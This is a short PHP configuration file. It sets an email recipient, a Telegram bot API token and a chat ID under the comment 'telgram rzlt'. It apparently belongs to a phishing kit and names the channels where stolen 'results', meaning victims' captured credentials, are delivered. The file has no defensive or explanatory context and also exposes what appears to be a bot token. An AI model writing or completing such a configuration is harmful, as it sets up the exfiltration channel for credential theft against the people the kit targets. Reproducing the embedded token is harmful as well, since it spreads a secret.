<?php

$send   = "@gmail.com";

//telgram rzlt
$api = "7234806487:AAFhcaCDiWBA9nqtKrqxyX";
$chatid = "775128671";

?>